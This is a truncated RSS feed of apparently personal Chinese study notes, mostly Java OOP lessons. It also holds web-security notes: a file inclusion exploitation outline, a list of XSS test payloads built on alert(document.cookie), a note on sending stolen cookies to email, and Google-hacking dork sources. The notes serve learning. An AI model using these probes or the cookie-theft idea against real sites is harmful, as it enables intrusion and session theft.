等等。 比如： ?file=content ?page=wuya.asp ?home=wuya.html 利用流程 1、发现漏洞 2、上传shell / 读取敏感文件（FUZZ） 3、执行恶意代码 敏感文件：比如shell、词典、木马、后门等等 技巧：http://LinuxIP/include.</description></item><item><title>05-脚本注入xss</title><link>https://ob.tianzhongs.ml/05-%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/05-%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5xss/</guid><description>基本概念 XSS ： Cross Site Script（跨站脚本攻击）
过程： 恶意攻击者利用web页面的漏洞，插入一些恶意代码， 当用户访问页面的时候，代码就会执行，这个时候就 达到了攻击的目的。
常被攻击书写的语言： JavaScript、Java、VBScript、 ActiveX、Flash
分类 反射型（dom），存储型
区别就是是否在服务器存储了其对应的xss跨站攻击脚本
存储型常用的就是在评论区，发帖等等地方，留下跨站攻击脚本，别人访问到这个来自服务器加载的评论，就会受到xss攻击。</description></item><item><title>0512_static变量</title><link>https://ob.tianzhongs.ml/0512_static%E5%8F%98%E9%87%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0512_static%E5%8F%98%E9%87%8F/</guid><description>0512_static变量 不声明static时 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class a02Chinese { public static void main(String[] args) { Chinese c1=new Chinese(&amp;#34;521&amp;#34;,&amp;#34;张三&amp;#34;,&amp;#34;Chinese&amp;#34;); Chinese c2=new Chinese(&amp;#34;522&amp;#34;,&amp;#34;李四&amp;#34;,&amp;#34;Chinese&amp;#34;); //输出 System.</description></item><item><title>0514_实例代码块</title><link>https://ob.tianzhongs.ml/0514_%E5%AE%9E%E4%BE%8B%E4%BB%A3%E7%A0%81%E5%9D%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0514_%E5%AE%9E%E4%BE%8B%E4%BB%A3%E7%A0%81%E5%9D%97/</guid><description>0514_实例代码块 语法格式 1 2 3 { java 语句; } 作用 [!作用] sun公司为程序员准备的特殊时机：对象创建时机； 实例代码块，会在构造方法前执行，只要构造方法创建对象，就会在对象创建之前执行实例代码块； 如果每个构造方法中都有相同的部分，可以将相同的部分放在实例代码块中，这样每次执行new对象的时候，都可以通过实例代码块执行内容。
eg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package a005StaticAndthis; public class a05ShiliDaimakuai { public static void main(String[] args) { System.</description></item><item><title>0515_静态方法和实例方法</title><link>https://ob.tianzhongs.ml/0515_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0515_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</guid><description>0515_静态方法和实例方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 public class a01Statictest { public static void main(String[] args) { daYin1();//直接调用 // 实例方法 a01Statictest dd = new a01Statictest();//创建该类的实例化对象 dd.</description></item><item><title>0516_空指针访问静态不会空指针</title><link>https://ob.tianzhongs.ml/0516_%E7%A9%BA%E6%8C%87%E9%92%88%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E4%B8%8D%E4%BC%9A%E7%A9%BA%E6%8C%87%E9%92%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0516_%E7%A9%BA%E6%8C%87%E9%92%88%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E4%B8%8D%E4%BC%9A%E7%A9%BA%E6%8C%87%E9%92%88/</guid><description>0516_空指针访问静态不会空指针 ![[../../../../assets/Pasted image 20220702164751.png]] 即使将对象置空，引用静态变量，依旧不会出现空指针异常， 因为静态变量不依赖于对象的建立，而是类级别的，类相关的</description></item><item><title>0517_实例方法的调用</title><link>https://ob.tianzhongs.ml/0517_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0517_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/</guid><description>0517_实例方法的调用 调用实例方法的原则 类=属性+方法
实例变量，需要对象 所以当方法需要由对象触发，就需要定义为实例方法
相关 ![[042b-实例方法]]</description></item><item><title>0518_不同代码块执行顺序</title><link>https://ob.tianzhongs.ml/0518_%E4%B8%8D%E5%90%8C%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0518_%E4%B8%8D%E5%90%8C%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/</guid><description>0518_不同代码块执行顺序 代码
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package a005StaticAndthis; public class A06DaimaShunxu { // 静态代码块 static{ System.</description></item><item><title>051_static</title><link>https://ob.tianzhongs.ml/051_static/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/051_static/</guid><description>051_static static翻译“静态” static修饰的都是类相关的，class级别的 static修饰的，都可以直接采用类名.进行访问 static修饰的变量：静态变量 static修饰的方法：[[052.静态方法和实例方法|静态方法]] [!变量的分类] 根据声明的位置分为 &amp;gt;1. 方法体中的变量：局部变量 &amp;gt;2. 方法体外的变量：成员变量 &amp;gt;成员变量又分为： &amp;gt;实例变量：需要通过[[../../02基本/024.对象的创建|创建对象]]来进行调用 &amp;gt;静态变量：可以直接使用，没有空指针异常的情况发生</description></item><item><title>051_静态代码块</title><link>https://ob.tianzhongs.ml/0512_%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0512_%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97/</guid><description>051_静态代码块 执行 类加载时执行，在main方法前执行 只执行一次 常常用于记录程序类加载到JVM中的日志 自上而下执行 允许多个静态代码块 是一个特殊时机：类加载时机 语法格式 1 2 3 4 static{ java 语句; java 语句; } eg !</description></item><item><title>0521_this的内存结构</title><link>https://ob.tianzhongs.ml/0521_this%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0521_this%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/</guid><description>0521_this的内存结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package a005StaticAndthis.</description></item><item><title>0522_this总结</title><link>https://ob.tianzhongs.ml/0522_this%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0522_this%E6%80%BB%E7%BB%93/</guid><description>0522_this总结 基本 this用于在实例对象中，表示当前对象
this不能用在静态方法中，因为静态方法是类级别的，不是对象级别的
静态方法中不存在当前对象，采用类.的方式使用静态方法
主要作用 在实例方法或者构造方法中 区分实例变量与局部变量 在构造方法中，可以 通过this在无参数构造方法去调用本类的有参数构造方法</description></item><item><title>0523_this例子</title><link>https://ob.tianzhongs.ml/0523_this%E4%BE%8B%E5%AD%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0523_this%E4%BE%8B%E5%AD%90/</guid><description>0523_this例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package day15作业; public class Homework01 { public static void main(String[] args) { Book book1 = new Book(&amp;#34;高三数学&amp;#34;,126); System.</description></item><item><title>0524_变量的分布</title><link>https://ob.tianzhongs.ml/0524_%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0524_%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/</guid><description>0524_变量的分布 局部变量、实例变量、静态变量在内存中的分配</description></item><item><title>0525_this无参调有参构造方法</title><link>https://ob.tianzhongs.ml/0525_this%E6%97%A0%E5%8F%82%E8%B0%83%E6%9C%89%E5%8F%82%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0525_this%E6%97%A0%E5%8F%82%E8%B0%83%E6%9C%89%E5%8F%82%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/</guid><description>0525_this无参调有参构造方法 1 2 3 4 5 6 7 8 9 10 11 12 public Date(){ // year=1982; // month=12; // day=3; //等同于通过this去调用这个对象的有参数构造方法 this(1982,12,3); } public Date(int year,int month,int day){ this.</description></item><item><title>0525_方法定义static</title><link>https://ob.tianzhongs.ml/0525_%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89static/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0525_%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89static/</guid><description>0525_方法定义static ```java public static void jiecheng(int a) {  int aa=1;
 for (int i = 1; i &amp;lt;= a; i++) {</description></item><item><title>0526_this的内存结构</title><link>https://ob.tianzhongs.ml/0526_this%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0526_this%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/</guid><description>0526_this的内存结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package a005StaticAndthis.</description></item><item><title>0529_变量的分布</title><link>https://ob.tianzhongs.ml/0529_%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0529_%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/</guid><description>0529_变量的分布 局部变量、实例变量、静态变量在内存中的分配</description></item><item><title>052_静态方法和实例方法</title><link>https://ob.tianzhongs.ml/052_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/052_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</guid><description>052_静态方法和实例方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 public class a01Statictest { public static void main(String[] args) { daYin1();//直接调用 // 实例方法 a01Statictest dd = new a01Statictest();//创建该类的实例化对象 dd.</description></item><item><title>053_空指针访问静态不会空指针</title><link>https://ob.tianzhongs.ml/053_%E7%A9%BA%E6%8C%87%E9%92%88%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E4%B8%8D%E4%BC%9A%E7%A9%BA%E6%8C%87%E9%92%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/053_%E7%A9%BA%E6%8C%87%E9%92%88%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E4%B8%8D%E4%BC%9A%E7%A9%BA%E6%8C%87%E9%92%88/</guid><description>053_空指针访问静态不会空指针 ![[../../../../assets/Pasted image 20220702164751.png]] 即使将对象置空，引用静态变量，依旧不会出现空指针异常， 因为静态变量不依赖于对象的建立，而是类级别的，类相关的</description></item><item><title>054_实例方法的调用</title><link>https://ob.tianzhongs.ml/054_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/054_%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/</guid><description>054_实例方法的调用 调用实例方法的原则 类=属性+方法
实例变量，需要对象 所以当方法需要由对象触发，就需要定义为实例方法
相关 ![[042b-实例方法]]</description></item><item><title>055_不同代码块执行顺序</title><link>https://ob.tianzhongs.ml/055_%E4%B8%8D%E5%90%8C%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/055_%E4%B8%8D%E5%90%8C%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/</guid><description>055_不同代码块执行顺序 代码
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package a005StaticAndthis; public class A06DaimaShunxu { // 静态代码块 static{ System.</description></item><item><title>06-WAF指纹识别</title><link>https://ob.tianzhongs.ml/06-WAF%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/06-WAF%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</guid><description>web application firewall：web应用防火墙 作用：主要用来过滤http/https的请求 作用 #question 作用 SQL Injection (SQLi)：阻止SQL注入 Cross Site Scripting (XSS)：阻止跨站脚本攻击 Local File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击 Remote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击 Remote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击 PHP Code Injectiod：阻止PHP代码注入 HTTP Protocol Violations：阻止违反HTTP协议的恶意访问 HTTPoxy：阻止利用远程代理感染漏洞进行攻击 Sshllshock：阻止利用Shellshock漏洞进行攻击 Session Fixation：阻止利用Session会话ID不变的漏洞进行攻击 Scanner Detection：阻止黑客扫描网站 Metadata/Error Leakages：阻止源代码/错误信息泄露 Project Honey Pot Blacklist：蜜罐项目黑名单 GeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断 分类 硬件型 WAF（厂商安装） 云 WAF（阿里云、腾讯云、华为云……） 软件型 WAF（部署在 Apache、Nginx 等 HTTP Server 中）eg：ModSecurity</description></item><item><title>06-文件包含漏洞的防御与修复</title><link>https://ob.tianzhongs.ml/06-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/06-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D/</guid><description> 1、PHP配置 2、禁用动态包含 3、过滤协议、目录字符 4、设置文件白名单</description></item><item><title>06-获取cookie发送到邮件</title><link>https://ob.tianzhongs.ml/06-%E8%8E%B7%E5%8F%96cookie%E5%8F%91%E9%80%81%E5%88%B0%E9%82%AE%E4%BB%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/06-%E8%8E%B7%E5%8F%96cookie%E5%8F%91%E9%80%81%E5%88%B0%E9%82%AE%E4%BB%B6/</guid><description> 已经有很多现成的工具了 需要注意的是，邮箱的绑定一般需要临时密码验证，不是账户本来的密码，比如qq邮箱。 参考案例：https://cloud.tencent.com/developer/article/1918319</description></item><item><title>061_继承基本概念</title><link>https://ob.tianzhongs.ml/061_%E7%BB%A7%E6%89%BF%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/061_%E7%BB%A7%E6%89%BF%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</guid><description>061_继承基本概念 重要 除了构造方法，其余的子类都继承，包括实例方法和get set方法都可以继承 在进行重新构造构造器的时候，可以通过super关键字快速完成，this.xx=xxx;的语句，比如
1 2 3 4 5 class A extends B{ public A(String name,int age){ super(name,age); } } 需要注意的是，super语句只能放在构造器内部的第一行</description></item><item><title>062_super关键字</title><link>https://ob.tianzhongs.ml/062_super%E5%85%B3%E9%94%AE%E5%AD%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/062_super%E5%85%B3%E9%94%AE%E5%AD%97/</guid><description>062_super关键字 在继承关系中，由于在子类的构造方法中，第一条语句默认为调用父类的无参构造方法（即默认为 super();，一般这行代码省略了）。
简单的来说，要想使用父类的那个构造方法，就super它的形参按顺序放进来
1 2 3 4 5 6 7 8 9 public class Person { public Person(String name, int age) { } public Person(String name, int age, String sex) { } } z</description></item><item><title>063_什么时候可以使用继承</title><link>https://ob.tianzhongs.ml/063_%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%BB%A7%E6%89%BF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/063_%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%BB%A7%E6%89%BF/</guid><description>063_什么时候可以使用继承 凡是可以用“is a”来描述的，都可以考虑采用继承
eg 猪是一个动物 信用卡是一个银行账户 [!注意] 即使两个类中有相同的代码，也不一定要采用继承 比如客户和产品中都有名字，不适合继承的，一是因为不符合常理，难以理解两者的关系，二是因为如果后续在父类中添加字段等等，那么子类也会受到奇怪的牵连</description></item><item><title>07-xss的检测与利用</title><link>https://ob.tianzhongs.ml/07-xss%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/07-xss%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8/</guid><description>测试payload 1 2 3 4 5 6 7 8 &amp;lt;script&amp;gt;alert(&amp;#39;XSS&amp;#39;)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; &amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; =&amp;#39;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt; %3Cscript%3Ealert(&amp;#39;XSS&amp;#39;)%3C/script%3E &amp;lt;img src=&amp;#34;javascript:alert(&amp;#39;XSS&amp;#39;)&amp;#34;&amp;gt; onerror=&amp;#34;alert(&amp;#39;XSS&amp;#39;)&amp;#34;&amp;gt; XSSER检测工具 https://xsser.</description></item><item><title>07-搜索引擎收集信息</title><link>https://ob.tianzhongs.ml/07-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/07-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF/</guid><description>public:: true
Google Hacking 运算符 完整匹配：&amp;quot;&amp;quot; 剔除不需要的内容： - 高级语法 语法仓库 https://www.exploit-db.com/google-hacking-database https://github.com/BullsEye0/google_dork_list
[[软件工具]] https://github.com/m3n0sd0n4ld/uDork
index of 可以根据网页中是否有这段文字，来找是否有泄露目录的网站 {:height 268, :width 744}</description></item><item><title>0711_方法覆盖override</title><link>https://ob.tianzhongs.ml/0711_%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96override/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0711_%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96override/</guid><description>0711_方法覆盖override 什么时候使用 子类继承父类之后，当继承的方法无法满足当前子类的业务需求，子类有权利对这个方法进行重新编写，进行方法覆盖。override
语法格式 编写的结论 两个类必须要有继承关系 重写之后的方法必须满足的条件**（除了修饰符列表可以不同，其他必须完全一样）** 相同的返回值类型 相同的方法名称 相同的形式参数列表 子类的访问权限不能更低，可以更高，比如父类是public,那么子类就不能是protected受保护的，但是相反则可以 覆盖之后的方法不能比之前的方法抛出更多的异常，可以更少或者没有。 注意事项 方法覆盖只针对方法，和属性（实例对象的属性，就是你定义的那几个字段）无关 私有方法（private）无法覆盖 构造方法不能继承，所以构造方法不能被覆盖 方法覆盖只能针对实例方法，静态方法无法覆盖 相关： 017.</description></item><item><title>0712_覆盖eg</title><link>https://ob.tianzhongs.ml/0712_%E8%A6%86%E7%9B%96eg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0712_%E8%A6%86%E7%9B%96eg/</guid><description>0712_覆盖eg 举例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package a007方法覆盖和多态; public class Dongwu1 { public static void main(String[] args) { System.</description></item><item><title>0713_方法覆盖经典例子</title><link>https://ob.tianzhongs.ml/0713_%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E7%BB%8F%E5%85%B8%E4%BE%8B%E5%AD%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0713_%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E7%BB%8F%E5%85%B8%E4%BE%8B%E5%AD%90/</guid><description>0713_方法覆盖经典例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package a007方法覆盖和多态; public class Speak { public static void main(String[] args) { People p1=new People(&amp;#34;人&amp;#34;); p1.</description></item><item><title>0714_例子toString方法覆盖</title><link>https://ob.tianzhongs.ml/0714_%E4%BE%8B%E5%AD%90toString%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0714_%E4%BE%8B%E5%AD%90toString%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96/</guid><description>0714_例子toString方法覆盖 要求 定义一个日期类 输出日期对象的时候，直接输出日期对象的值
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 public class ToString1 { public static void main(String[] args) { Date d1=new Date(2019, 12, 2); System.</description></item><item><title>0721_多态</title><link>https://ob.tianzhongs.ml/0721_%E5%A4%9A%E6%80%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0721_%E5%A4%9A%E6%80%81/</guid><description>0721_多态 基本概念 多动态，就是多种形态，多种状态。
简单的来说，就是java程序在 编译阶段 和执行阶段 所真正参与的是不同的对象，所以叫多态。 父类型引用执行子类型对象，包括编译阶段和执行阶段 编译阶段 ：静态绑定父类的方法（方法区） ^jtbd 执行阶段：动态绑定子类的方法（堆内存）</description></item><item><title>0722_多态举例</title><link>https://ob.tianzhongs.ml/0722_%E5%A4%9A%E6%80%81%E4%B8%BE%E4%BE%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0722_%E5%A4%9A%E6%80%81%E4%B8%BE%E4%BE%8B/</guid><description>0722_多态举例 eg 定义Animal、Cat、Dog类用来定义对象 动物
1 2 3 4 5 6 7 package a007方法覆盖和多态; public class Animal { public void move(){ System.</description></item><item><title>0723_向下转型</title><link>https://ob.tianzhongs.ml/0723_%E5%90%91%E4%B8%8B%E8%BD%AC%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0723_%E5%90%91%E4%B8%8B%E8%BD%AC%E5%9E%8B/</guid><description>0723_向下转型 向上转型和向下转型 java中允许 向上转型，也允许向下转型（不要说自动类型转换和强制类型转换，那是基本变量类型转换，上图只是为了能够更好地理解） 不论是向上转型还是向下转型，都必须有继承关系（没有继承关系，那么不能转型） 向上转型： Anlimal a=new Cat() 向下转型：Cat b=(Cat)a
什么时候使用向下转型 不要随便做强制转换
当你访问的是一个父类中没有，子类对象中所“特有”的方法，此时必须向下转型 当然，你也可以在父类中补充这个方法，那样就是方法覆盖了，就不用向下转型了 原因是 虽然aa3运行是猫对象，但是由于底层是狗对象，而且Cat和Dog两个之间没有相互继承关系，所以无法向下转型，抛出异常，可以通过if判断和instanceof判断来避免这种错误 eg 在Cat类中增加猫抓老鼠的方法 1 2 3 public void catchMouse(){ System.</description></item><item><title>0724_instanceof运算符</title><link>https://ob.tianzhongs.ml/0724_instanceof%E8%BF%90%E7%AE%97%E7%AC%A6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0724_instanceof%E8%BF%90%E7%AE%97%E7%AC%A6/</guid><description>0724_instanceof运算符 [!作用] 用于判断 某对象实例 是否动态指向 一个类 ，或者由一个类直接或间接创建的
重要结论 左边是实例对象，右边是类 只要左边的实际对象 是右边类的 继承树 以下的类或刚好一样的类，就是true 判断 判断方法： 可以通过判断是否与实例对象的底层对象在 同一底层类 上进行判断 实例对象 “蔡徐坤” 是否是某个类 直接或者间接创建的，比如 person cxk=new chinse，“人类”下有“中国人”和“美国人”两个子类，，那么 蔡徐坤 instanceof 中国人或者蔡徐坤 instanceof 人就为true，而蔡徐坤 instanceof 美国人就为false !</description></item><item><title>0725_多态例子a主人喂宠物</title><link>https://ob.tianzhongs.ml/0725_%E5%A4%9A%E6%80%81%E4%BE%8B%E5%AD%90a%E4%B8%BB%E4%BA%BA%E5%96%82%E5%AE%A0%E7%89%A9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0725_%E5%A4%9A%E6%80%81%E4%BE%8B%E5%AD%90a%E4%B8%BB%E4%BA%BA%E5%96%82%E5%AE%A0%E7%89%A9/</guid><description>0725_多态例子a主人喂宠物 代码
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package a007方法覆盖和多态.</description></item><item><title>0726_宠物养猫优化</title><link>https://ob.tianzhongs.ml/0726_%E5%AE%A0%E7%89%A9%E5%85%BB%E7%8C%AB%E4%BC%98%E5%8C%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0726_%E5%AE%A0%E7%89%A9%E5%85%BB%E7%8C%AB%E4%BC%98%E5%8C%96/</guid><description>0726_宠物养猫优化 相关 类继承：猫狗与宠物之间的继承关系 向下继承：向下继承，如果需要调用子类独有的方法（pig的睡觉方法，在pet中没有），需要强制转换类型，前提是两个类继承关系，且[[077.向下转型|向下转型]]才必须强制转型 独有实例方法的调用 向上继承的创建对象：Pet p2=new Pig(); 多态：宠物的多个具体事物，有不同的吃的方法，主人通过调用喂养方法，去访问宠物的吃 方法覆盖override：由于子类有不同的eat方法，在实际调用的时候，会访问其具体对象的eat方法 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 package 